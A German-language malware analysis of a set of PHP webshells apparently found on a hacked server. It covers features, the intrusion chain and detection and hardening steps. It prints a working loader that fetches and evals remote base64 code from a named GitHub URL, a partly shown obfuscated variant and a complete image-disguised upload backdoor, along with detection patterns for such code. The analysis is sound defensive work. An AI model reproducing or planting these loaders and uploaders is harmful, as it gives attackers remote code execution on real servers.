# 0xShell Webshells - Detaillierte Analyse

## Was sind Webshells?

Webshells sind PHP-Skripte die auf einem gehackten Server platziert werden. Sie geben dem Angreifer:
- **Remote-Zugang** zum Server über den Browser
- **Kommandozeile** ohne SSH
- **Dateizugriff** ohne FTP
- **Persistenz** - bleibt auch nach Passwort-Änderung

---

## Die 27 Webshells im Detail

### Kategorie 1: Haupt-Shells (Full-Featured)

#### `0xShellori.php` - Die Hauptwaffe
**Größe:** 100 KB
**Features:**
| Funktion | Beschreibung |
|----------|--------------|
| **File Manager** | Dateien anzeigen, bearbeiten, löschen, umbenennen |
| **Command Execution** | Shell-Befehle ausführen (ls, cat, wget, etc.) |
| **System Info** | OS, PHP-Version, User, IPs, offene Ports |
| **Config Grabber** | Findet automatisch Passwörter in WordPress, Joomla, Magento, Drupal |
| **Symlink Attack** | Zugriff auf andere User-Verzeichnisse |
| **Mass Defacement** | Viele Dateien gleichzeitig ändern |
| **CMS Takeover** | Admin-Passwörter von WordPress/Joomla zurücksetzen |
| **Back-Connect** | Reverse Shell zum Angreifer |

**So sieht das aus:**
```
┌─────────────────────────────────────────────────────────┐
│  0x1999 Shell v2.0                                      │
├─────────────────────────────────────────────────────────┤
│  Server: Linux web01 5.4.0                              │
│  User: www-data                                         │
│  Current Dir: /var/www/html/                            │
├─────────────────────────────────────────────────────────┤
│  [File Manager] [Command] [Config Grab] [Symlink]       │
├─────────────────────────────────────────────────────────┤
│  $ _                                                    │
│  ┌──────────────────────────────────────────────────┐   │
│  │ drwxr-xr-x  wp-content/                          │   │
│  │ -rw-r--r--  wp-config.php                        │   │
│  │ -rw-r--r--  index.php                            │   │
│  └──────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────┘
```

---

### Kategorie 2: Loader-Shells (Laden Code von extern)

#### `0xShell.php` / `0x.php` / `weso.php`
**Größe:** ~100-150 Bytes
**Funktion:** Lädt die echte Shell von GitHub

```php
<?php
$x=file_get_contents("https://raw.githubusercontent.com/temempik1337/0xShell/main/0xencbase.js");
eval(base64_decode($x));
?>
```

**Warum so klein?**
- Einfacher zu verstecken
- Weniger Detection durch Antivirus
- Echte Shell liegt extern → kann jederzeit geändert werden

---

### Kategorie 3: Obfuskierte Versionen

#### `0xObs.php` / `0xShellObs.php`
**Größe:** 250-550 Bytes
**Funktion:** Gleich wie oben, aber verschleiert

```php
<?php
$GLOBALS['hfkvgwtttmj']="\x68\x74\x74\x70\x73...";  // Versteckte URL
$ch=curl_init($GLOBALS['hfkvgwtttmj']);
// ... mehr verschleierter Code
eval(base64_decode($response));
?>
```

**Verschleierungs-Techniken:**
- Hex-Encoding (`\x68` = "h")
- Base64
- GLOBALS-Array statt Variablen
- Zufällige Variablennamen

---

### Kategorie 4: Spezial-Tools

#### `login.php` - Fake Login
**Funktion:** Lädt externe Shell, zeigt "Failed!" wenn nicht erreichbar
**Zweck:** Sieht aus wie normales Login, ist aber Backdoor

#### `up.php` - File Uploader
```php
GIF89a;  <!-- Tarnt sich als GIF-Bild -->
<form action="" method="post" enctype="multipart/form-data">
<input type="file" name="file">
<input type="submit" value="Upload">
</form>
<?php
if($_POST['_upl']=="Upload"){
    copy($_FILES['file']['tmp_name'], $_FILES['file']['name']);
}
?>
```

**Trick:** `GIF89a;` am Anfang → Datei wird als Bild erkannt, nicht als PHP

#### `root.php` - Privilege Escalation
**Funktion:** Versucht Root-Rechte zu bekommen
**Methoden:**
- Schreibt `rootshell.c` und kompiliert mit GCC
- Nutzt pkexec-Exploit
- Erstellt Python-Backdoor

#### `adminer.php` - Datenbank-Manager
**Größe:** 476 KB
**Was es ist:** Adminer 4.8.1 (legitimes Tool, aber missbraucht)
**Funktion:**
- MySQL/PostgreSQL/SQLite verwalten
- Datenbank-Dumps erstellen
- SQL-Queries ausführen
- Passwörter ändern

---

### Kategorie 5: Weitere Shells

| Datei | Größe | Funktion |
|-------|-------|----------|
| `1337.php` | 1 KB | Kleine Shell mit Command Execution |
| `index.php` / `_index.php` | 350 B | Loader für externe Shell |
| `lndex.php` | 600 B | Typosquatting (l statt I) - Loader |
| `xoxo.php` | 600 B | Loader |
| `crot.php` | 400 B | Loader |
| `memek.php` | 540 B | Loader |
| `f.php` | 3.2 KB | File Manager |
| `untitled.php` | 17 KB | Größere Shell |
| `tifa.png.php` | 91 KB | Als Bild getarnte Shell |
| `wesoori.php` | 105 KB | Vollständige Shell |
| `log_update.php` | 460 B | Loader |
| `logout.php` | 1 KB | Loader |

---

## JavaScript-Dateien

#### `0xencbase.js` / `wesobase.js`
**Größe:** 134 KB / 140 KB
**Inhalt:** Base64-encodierte PHP-Shells
**Funktion:** Werden von den kleinen Loader-Shells geladen und ausgeführt

---

## Wie der Angreifer die Shells nutzt

```
1. INITIAL ACCESS
   Angreifer exploitet Laravel RCE
         │
         ▼
2. UPLOAD SHELL
   Lädt up.php hoch (klein, unauffällig)
         │
         ▼
3. UPLOAD MAIN SHELL
   Nutzt up.php um 0xShellori.php hochzuladen
         │
         ▼
4. FULL CONTROL
   Hat jetzt kompletten Zugang:
   - Dateien durchsuchen
   - Config-Dateien stehlen
   - Datenbank zugreifen
   - Weitere Malware installieren
         │
         ▼
5. PERSISTENCE
   Versteckt mehrere Shells an verschiedenen Orten
   (falls eine gefunden wird)
         │
         ▼
6. MONETARISIERUNG
   Installiert Cryptominer (linuxsys)
```

---

## Erkennungsmerkmale

### Im Code suchen nach:
```php
eval(base64_decode(
file_get_contents("http
system($_GET
exec($_POST
shell_exec(
passthru(
GIF89a;<?php
```

### Verdächtige Dateinamen:
```
*.php.txt
*.png.php
*.jpg.php
lndex.php (mit L statt I)
_index.php
```

### Verdächtige Größen:
- Sehr klein (< 1 KB) aber PHP → wahrscheinlich Loader
- Sehr groß (> 50 KB) PHP-Datei ohne Framework → wahrscheinlich Shell

---

## Schutzmaßnahmen

### 1. Dateisystem scannen:
```bash
# Nach eval/base64 suchen
grep -r "eval(base64_decode" /var/www/

# Nach file_get_contents mit URL
grep -r "file_get_contents.*http" /var/www/

# Nach verdächtigen Dateinamen
find /var/www -name "*.php.txt" -o -name "*.png.php"
```

### 2. PHP härten:
```ini
; php.ini
disable_functions = exec,passthru,shell_exec,system,proc_open,popen
allow_url_fopen = Off
allow_url_include = Off
```

### 3. Upload-Verzeichnis:
```apache
# .htaccess in Upload-Ordnern
php_flag engine off
```

---

*Analyse erstellt: 2025-12-08*
